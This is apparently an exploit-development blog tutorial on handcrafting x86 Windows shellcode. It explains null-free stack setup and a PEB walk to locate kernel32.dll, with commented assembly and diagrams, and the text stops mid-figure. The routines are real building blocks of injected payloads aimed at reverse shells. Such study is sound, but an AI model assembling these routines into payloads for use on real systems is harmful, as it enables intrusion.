---
title: "The Art of x86 Windows Shellcoding"
date: 2026-11-09 00:00:00 +0300
categories: [Exploit Development, Shellcoding]
tags: [x86, shellcoding, windows, assembly, exploit-development]
description: "A deep dive into crafting custom x86 Windows shellcode every instruction explained, every API call visualized."
image:
  path: /assets/img/shellcoding/banner.svg
---

I always wondered what actually happens between the moment an exploit hijacks execution and the moment a shell pops on the attacker's screen. Not the Metasploit-generated blob the actual instructions. The PEB walk, the hash loop, the struct built one DWORD at a time on the stack. So I sat down and wrote every payload from scratch, in raw x86 assembly, until the mystery was gone.

This is everything I learned. Every instruction is here, every API call is explained, and every concept has a diagram. No frameworks, no shortcuts just you, the CPU, and the Windows API.

---

## 1. What Is Shellcode?

**Shellcode** is a small, self-contained block of machine code designed to be injected into a running process and executed directly. The name comes from its original purpose -- spawning a shell -- but modern shellcode can do anything: download files, add user accounts, open reverse connections, or disable security software.

What makes shellcode different from a normal compiled program?

- **No loader.** When Windows runs an `.exe`, the PE loader resolves imports, fixes up addresses, and sets up memory sections. Shellcode gets none of that. It lands in memory at an unpredictable address and must figure everything out itself.
- **No null bytes** (usually). Shellcode is often delivered through string-handling functions like `strcpy()` that stop at `0x00`. A single null byte truncates our payload. We must encode around them.
- **No hardcoded addresses.** DLLs load at different addresses thanks to ASLR. Shellcode must locate every API function it needs at runtime.

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00d4ff" stop-opacity="0.6"/><stop offset="100%" stop-color="#ff3366" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s1)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1)"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s1)">Normal EXE vs Shellcode</text>
  <!-- Normal EXE side -->
  <rect x="30" y="50" width="330" height="230" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="1.5" opacity="0.9"/>
  <text x="195" y="75" text-anchor="middle" fill="#00d4ff" font-size="14" font-weight="bold">Normal .exe</text>
  <rect x="50" y="90" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="111" text-anchor="middle" fill="#00ff88" font-size="11">PE Loader resolves all imports</text>
  <rect x="50" y="130" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="151" text-anchor="middle" fill="#00ff88" font-size="11">Fixed base address (rebased by ASLR)</text>
  <rect x="50" y="170" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="191" text-anchor="middle" fill="#00ff88" font-size="11">IAT provides function pointers</text>
  <rect x="50" y="210" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="231" text-anchor="middle" fill="#00ff88" font-size="11">Sections: .text, .data, .rdata mapped</text>
  <text x="195" y="265" text-anchor="middle" fill="#8b949e" font-size="11">Everything set up before main() runs</text>
  <!-- Shellcode side -->
  <rect x="390" y="50" width="330" height="230" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="1.5" opacity="0.9"/>
  <text x="555" y="75" text-anchor="middle" fill="#ff3366" font-size="14" font-weight="bold">Shellcode</text>
  <rect x="410" y="90" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="111" text-anchor="middle" fill="#ff3366" font-size="11">Must find every API at runtime</text>
  <rect x="410" y="130" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="151" text-anchor="middle" fill="#ff3366" font-size="11">Lands at unknown address (PIC)</text>
  <rect x="410" y="170" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="191" text-anchor="middle" fill="#ff3366" font-size="11">Walks PEB + parses PE exports</text>
  <rect x="410" y="210" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="231" text-anchor="middle" fill="#ff3366" font-size="11">No sections -- raw bytes in memory</text>
  <text x="555" y="265" text-anchor="middle" fill="#8b949e" font-size="11">Must bootstrap everything itself</text>
</svg></div>

This last point is critical. Our shellcode must be **position-independent code (PIC)** -- it works regardless of where in memory it lands. Every address we need, we compute on the fly.

### x86 Primer: The Registers We Care About

Before we dive into assembly, let's establish the registers we will use constantly throughout this series.

**General-purpose registers:**

| Register | Conventional Use | Our Use |
|----------|-----------------|---------|
| **EAX** | Return values, accumulator | Function return values, scratch math |
| **EBX** | Base register (callee-saved) | DLL base addresses |
| **ECX** | Counter for loops | Loop counters, string lengths |
| **EDX** | Data, I/O operations | Hash accumulator, scratch |
| **ESI** | Source index for string ops | Source pointers, PEB traversal |
| **EDI** | Destination index | Destination pointers, PE table pointers |
| **EBP** | Base/frame pointer | **Our variable table** (key design choice) |
| **ESP** | Stack pointer | Top of stack (grows downward) |

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s2)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s2)">x86 Register Map for Shellcode</text>
  <!-- Data registers -->
  <text x="60" y="55" fill="#00d4ff" font-size="12" font-weight="bold">Data Registers</text>
  <rect x="30" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="40" y="82" fill="#00ff88" font-size="12" font-weight="bold">EAX</text>
  <text x="100" y="95" fill="#e0e7ff" font-size="10">return values</text>
  <rect x="200" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="82" fill="#ff6b35" font-size="12" font-weight="bold">EBX</text>
  <text x="270" y="95" fill="#e0e7ff" font-size="10">DLL base addr</text>
  <rect x="370" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="380" y="82" fill="#00d4ff" font-size="12" font-weight="bold">ECX</text>
  <text x="440" y="95" fill="#e0e7ff" font-size="10">loop counter</text>
  <rect x="540" y="65" width="180" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="550" y="82" fill="#00d4ff" font-size="12" font-weight="bold">EDX</text>
  <text x="620" y="95" fill="#e0e7ff" font-size="10">hash accumulator</text>
  <!-- Index registers -->
  <text x="60" y="130" fill="#00d4ff" font-size="12" font-weight="bold">Index Registers</text>
  <rect x="30" y="140" width="220" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="40" y="157" fill="#00d4ff" font-size="12" font-weight="bold">ESI</text>
  <text x="120" y="170" fill="#e0e7ff" font-size="10">source ptr / PEB walk</text>
  <rect x="270" y="140" width="220" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="280" y="157" fill="#00d4ff" font-size="12" font-weight="bold">EDI</text>
  <text x="360" y="170" fill="#e0e7ff" font-size="10">dest ptr / PE tables</text>
  <!-- Special registers -->
  <text x="60" y="205" fill="#ff3366" font-size="12" font-weight="bold">Critical Registers</text>
  <rect x="30" y="215" width="330" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="40" y="235" fill="#ff3366" font-size="13" font-weight="bold">EBP</text>
  <text x="90" y="235" fill="#e0e7ff" font-size="12">= our VARIABLE TABLE</text>
  <text x="90" y="255" fill="#8b949e" font-size="10">[ebp+N] stores resolved API addresses</text>
  <rect x="390" y="215" width="330" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="400" y="235" fill="#ff3366" font-size="13" font-weight="bold">ESP</text>
  <text x="450" y="235" fill="#e0e7ff" font-size="12">= stack pointer (grows DOWN)</text>
  <text x="450" y="255" fill="#8b949e" font-size="10">push decrements, pop increments</text>
  <!-- stdcall box -->
  <rect x="30" y="278" width="690" height="30" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="298" text-anchor="middle" fill="#ff6b35" font-size="11">stdcall: push args right-to-left, callee cleans stack, return value in EAX</text>
</svg></div>

> **Key concept:** The x86 stack grows *downward* in memory. `push eax` decrements ESP by 4, then writes EAX at the new ESP. `pop eax` reads from ESP, then increments by 4.

**Calling convention (cdecl/stdcall):** Windows API functions use **stdcall** -- arguments are pushed onto the stack right-to-left, the callee cleans up the stack, and the return value lands in EAX. So to call `SomeFunction(arg1, arg2, arg3)`, we push `arg3`, then `arg2`, then `arg1`, then `call`.

With those fundamentals in place, let's build the skeleton that every piece of our shellcode will hang from.

---

## 2. The Shellcode Skeleton

Every shellcode we write in this series starts with the same two instructions. They look simple, but the reasoning behind them is worth understanding fully.

```nasm
start:
    mov   ebp, esp          ; Anchor our variable table
    add   esp, 0xfffff9f0   ; Carve out stack space (null-free)
```

### Anchoring EBP as Our Variable Table

The first instruction, `mov ebp, esp`, captures the current top of the stack into EBP. From this point forward, **EBP becomes our fixed reference point** -- a personal variable table where we store every resolved API address and piece of data we need.

Why EBP? Because in normal compiled code, EBP is the frame pointer -- it points to a stable location in the stack frame while ESP moves around with every push and pop. We exploit that same stability. No matter how much we push and pop during execution, EBP never moves.

Our variable table layout:

| Offset | Contents |
|--------|----------|
| `[ebp+0x04]` | Address of `find_function` (our API resolver) |
| `[ebp+0x08]` | Resolved address of first API (e.g., `LoadLibraryA`) |
| `[ebp+0x0C]` | Resolved address of second API (e.g., `CreateProcessA`) |
| `[ebp+0x10]` | Resolved address of third API (e.g., `ExitProcess`) |
| `[ebp+0x14]` | ... and so on for every API we need |

We simply `mov [ebp+0x08], eax` after resolving an API, and later `call dword ptr [ebp+0x08]` to invoke it. Clean, predictable, and easy to extend.

### Carving Stack Space Without Null Bytes

The second instruction is where things get clever:

```nasm
add   esp, 0xfffff9f0   ; ESP = ESP - 0x610 (1552 bytes)
```

Wait -- we are *adding* to ESP to move it *down*? Yes. Let's work through the math.

We want to subtract `0x610` (1552 decimal) from ESP to reserve stack space. But `sub esp, 0x610` would assemble with null bytes in the immediate value (`0x00000610`). Those nulls would kill our shellcode in most injection scenarios.

Instead, we use **two's complement arithmetic**. The two's complement of `0x610` is:

```
0x00000610  -->  NOT  -->  0xFFFFF9EF  -->  +1  -->  0xFFFFF9F0
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s3"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="tc-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s3)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s3)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s3)">Two's Complement: Turning SUB into ADD</text>
  <!-- Step 1: original value -->
  <rect x="30" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="105" y="75" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0x00000610</text>
  <text x="105" y="98" text-anchor="middle" fill="#8b949e" font-size="10">has null bytes!</text>
  <!-- Arrow 1 -->
  <line x1="180" y1="82" x2="220" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="200" y="72" text-anchor="middle" fill="#00ff88" font-size="10">NOT</text>
  <!-- Step 2: NOT -->
  <rect x="225" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="300" y="75" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xFFFFF9EF</text>
  <text x="300" y="98" text-anchor="middle" fill="#8b949e" font-size="10">bitwise invert</text>
  <!-- Arrow 2 -->
  <line x1="375" y1="82" x2="415" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="395" y="72" text-anchor="middle" fill="#00ff88" font-size="10">+1</text>
  <!-- Step 3: +1 -->
  <rect x="420" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="495" y="75" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0xFFFFF9F0</text>
  <text x="495" y="98" text-anchor="middle" fill="#00ff88" font-size="10">no null bytes!</text>
  <!-- Arrow 3 -->
  <line x1="570" y1="82" x2="610" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="590" y="72" text-anchor="middle" fill="#00ff88" font-size="10">USE</text>
  <!-- Result -->
  <rect x="615" y="50" width="110" height="65" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="670" y="72" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">add esp,</text>
  <text x="670" y="90" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">0xFFFFF9F0</text>
  <text x="670" y="108" text-anchor="middle" fill="#e0e7ff" font-size="9">= esp - 0x610</text>
  <!-- Bottom explanation -->
  <rect x="80" y="135" width="590" height="65" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="375" y="158" text-anchor="middle" fill="#e0e7ff" font-size="12">In 32-bit arithmetic: 0xFFFFF9F0 = -0x610</text>
  <text x="375" y="178" text-anchor="middle" fill="#00ff88" font-size="12">ESP + (-0x610) = ESP - 0x610</text>
  <text x="375" y="193" text-anchor="middle" fill="#8b949e" font-size="10">The CPU does not distinguish signed from unsigned -- it just adds bits</text>
</svg></div>

So `0xFFFFF9F0` is the two's complement representation of `-0x610`. Adding a negative number is the same as subtracting the positive:

```
ESP + 0xFFFFF9F0 = ESP - 0x610
```

The value `0xFFFFF9F0` contains no null bytes. Problem solved.

> **Why 1552 bytes?** Our shellcode will push structures onto the stack -- `STARTUPINFOA` (68 bytes), `PROCESS_INFORMATION` (16 bytes), `WSADATA` (400 bytes), `sockaddr_in` (16 bytes), plus all the API arguments. 1552 bytes gives us comfortable room without being wasteful. In constrained environments, you can tune this down.

### Visualizing the Stack Layout

Here is how memory looks after these two instructions execute:

<div align="center"><svg viewBox="0 0 750 480" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s201" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s201"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s201" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arrowDown" markerWidth="10" markerHeight="7" refX="5" refY="7" orient="auto">
      <polygon points="0,0 10,0 5,7" fill="#00ff88"/>
    </marker>
    <marker id="arrowRight" markerWidth="7" markerHeight="10" refX="7" refY="5" orient="auto">
      <polygon points="0,0 7,5 0,10" fill="#00d4ff"/>
    </marker>
    <marker id="arrowLeft" markerWidth="7" markerHeight="10" refX="0" refY="5" orient="auto">
      <polygon points="7,0 0,5 7,10" fill="#00d4ff"/>
    </marker>
      <linearGradient id="bg_s201" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s201"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s201" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="480" rx="10" fill="url(#bg_s201)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s201)"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s201)" font-weight="bold">Stack Layout After Skeleton Setup</text>
  <text x="60" y="55" fill="#8b949e" font-size="11">HIGH MEMORY</text>
  <rect x="180" y="70" width="320" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="95" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">EBP (original ESP)</text>
  <rect x="180" y="115" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="136" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x04] = find_function addr</text>
  <rect x="180" y="150" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="171" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x08] = LoadLibraryA</text>
  <rect x="180" y="185" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="206" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x0C] = CreateProcessA</text>
  <rect x="180" y="220" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="241" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x10] = ExitProcess</text>
  <rect x="180" y="255" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="276" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x14] ... more APIs ...</text>
  <rect x="180" y="295" width="320" height="100" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="340" y="340" text-anchor="middle" fill="#00ff88" font-size="13">~1552 bytes free space</text>
  <text x="340" y="360" text-anchor="middle" fill="#8b949e" font-size="11">(structures, arguments, strings)</text>
  <rect x="180" y="400" width="320" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="425" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">ESP (after add esp, 0xfffff9f0)</text>
  <text x="60" y="455" fill="#8b949e" font-size="11">LOW MEMORY</text>
  <text x="550" y="93" fill="#ff3366" font-size="12">EBP --></text>
  <text x="550" y="423" fill="#ff3366" font-size="12">ESP --></text>
  <line x1="140" y1="90" x2="140" y2="420" stroke="#00ff88" stroke-width="2" marker-end="url(#arrowDown)"/>
  <text x="70" y="260" fill="#00ff88" font-size="11" text-anchor="middle" transform="rotate(-90, 70, 260)">0x610 bytes</text>
  <text x="670" y="250" fill="#8b949e" font-size="11" transform="rotate(90, 670, 250)">Stack grows down</text>
</svg></div>

*Figure 2.1 - The shellcode skeleton creates a fixed variable table at EBP and reserves 1552 bytes of working space below it. Positive offsets from EBP store resolved API addresses; the free space below holds structures and arguments during API calls.*

This two-instruction skeleton is the foundation we will never change. Everything else builds on top of it.

---

## 3. Walking the PEB: Finding kernel32.dll

Our shellcode needs to call Windows API functions like `LoadLibraryA`, `CreateProcessA`, and `WSAStartup`. But where are they? They live in DLLs, and DLLs load at unpredictable addresses. So the first thing we must do is find the base address of **kernel32.dll** -- the DLL that exports the most essential Windows APIs.

Windows gives us a way in: the **Process Environment Block (PEB)**. Every running process has one, and it contains a linked list of every loaded module (DLL) along with their base addresses. Better yet, access to the PEB requires no API calls at all -- it is reachable through a segment register.

### The Chain: TEB to PEB to Modules

Here is the chain we follow:

<div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="peb-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
    <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="160" rx="10" fill="url(#bg_s202)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s202)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s202)" font-weight="bold">The PEB Walk: 4 Steps to kernel32.dll</text>
  <!-- Step 1 -->
  <rect x="20" y="55" width="140" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="90" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">1</text>
  <text x="90" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">FS:[0x30]</text>
  <text x="90" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">TEB has PEB ptr</text>
  <text x="90" y="127" text-anchor="middle" fill="#8b949e" font-size="9">xor ecx,ecx</text>
  <!-- Arrow -->
  <line x1="160" y1="90" x2="190" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 2 -->
  <rect x="195" y="55" width="140" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="265" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">2</text>
  <text x="265" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">PEB+0x0C</text>
  <text x="265" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">PEB_LDR_DATA</text>
  <text x="265" y="127" text-anchor="middle" fill="#8b949e" font-size="9">loader tables</text>
  <!-- Arrow -->
  <line x1="335" y1="90" x2="365" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 3 -->
  <rect x="370" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="450" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">3</text>
  <text x="450" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">LDR+0x1C</text>
  <text x="450" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">InInitOrder list</text>
  <text x="450" y="127" text-anchor="middle" fill="#8b949e" font-size="9">linked list of DLLs</text>
  <!-- Arrow -->
  <line x1="530" y1="90" x2="560" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 4 -->
  <rect x="565" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="645" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">4</text>
  <text x="645" y="93" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Entry+0x08</text>
  <text x="645" y="110" text-anchor="middle" fill="#ff3366" font-size="10">Base Address!</text>
  <text x="645" y="127" text-anchor="middle" fill="#00ff88" font-size="9">EBX = kernel32 base</text>
</svg></div>

1. **Thread Environment Block (TEB):** On x86 Windows, the `FS` segment register always points to the TEB of the current thread. At offset `0x30` within the TEB sits a pointer to the PEB.

2. **PEB (Process Environment Block):** At offset `0x0C` within the PEB sits a pointer to `PEB_LDR_DATA` -- the loader data structure.

3. **PEB_LDR_DATA:** This structure contains three doubly-linked lists of loaded modules, each ordered differently:
   - `InLoadOrderModuleList` (offset `0x0C`) -- order they were loaded
   - `InMemoryOrderModuleList` (offset `0x14`) -- order in memory
   - `InInitializationOrderModuleList` (offset `0x1C`) -- order they were initialized

4. **Module entries:** Each node in the list is an `LDR_DATA_TABLE_ENTRY`. From the entry we can read the DLL base address and its name.

> **Which list should we use?** Both `InInitializationOrderModuleList` (offset `0x1C`) and `InMemoryOrderModuleList` (offset `0x14`) work. The initialization-order list typically gives us: ntdll.dll first, then kernelbase.dll (on modern Windows), then kernel32.dll. The code below uses the initialization-order list; the offsets for base address and module name differ between the two lists, so pay attention to which one your code targets.

### The Assembly

```nasm
find_kernel32:
    xor   ecx, ecx              ; ECX = 0 (also clears for later cmp)
    mov   esi, fs:[ecx+0x30]    ; ESI = PEB address (TEB->PEB at offset 0x30)
    mov   esi, [esi+0x0C]       ; ESI = PEB->Ldr (PEB_LDR_DATA)
    mov   esi, [esi+0x1C]       ; ESI = Ldr->InInitializationOrderModuleList

next_module:
    mov   ebx, [esi+0x08]       ; EBX = module base address
    mov   edi, [esi+0x20]       ; EDI = pointer to module name (Unicode)
    mov   esi, [esi]            ; ESI = Flink (next entry in the list)
    cmp   [edi+12*2], cx        ; Is the 13th Unicode char null?
    jne   next_module           ; No -- try the next module
```

Let's walk through every instruction.

**`xor ecx, ecx`** -- We zero out ECX. Why not `mov ecx, 0`? Because that assembles as `B9 00 00 00 00` -- four null bytes. `xor ecx, ecx` assembles as `31 C9` -- two bytes, no nulls. We will also reuse the zero in CX for the string comparison later.

**`mov esi, fs:[ecx+0x30]`** -- This reads the PEB pointer from the TEB. We write `fs:[ecx+0x30]` instead of `fs:[0x30]` because some assemblers encode a bare `fs:[0x30]` with a null-containing displacement. Using `ecx+0x30` (where ECX is zero) avoids that.

**`mov esi, [esi+0x0C]`** -- We dereference the PEB to get `PEB_LDR_DATA`. The `Ldr` field is at offset `0x0C` within the PEB.

**`mov esi, [esi+0x1C]`** -- We follow the `InInitializationOrderModuleList` head pointer at offset `0x1C` within `PEB_LDR_DATA`. ESI now points to the first entry in the linked list.

**`mov ebx, [esi+0x08]`** -- From the current list entry, we grab the base address of the loaded module. For `InInitializationOrderModuleList`, the base address lives at offset `0x08`.

**`mov edi, [esi+0x20]`** -- We grab the pointer to the module's name string (Unicode, UTF-16LE). This is at offset `0x20` from the list entry.

**`mov esi, [esi]`** -- We advance ESI to the next entry in the linked list (the Flink pointer is at offset `0x00`). We do this *before* the comparison because if this module is not kernel32.dll, we need ESI already pointing to the next entry.

**`cmp [edi+12*2], cx`** -- Here is the identification trick. The string `kernel32.dll` has exactly 12 characters. In Unicode (UTF-16LE), each character is 2 bytes, so the 13th character (index 12) is at byte offset `12 * 2 = 24`. For `kernel32.dll`, that 13th character is the null terminator (`0x0000`). CX is still zero from our earlier `xor ecx, ecx`, so this comparison checks: "Does this module name have exactly 12 characters?" That uniquely identifies `kernel32.dll` among the typically loaded modules.

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s101" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
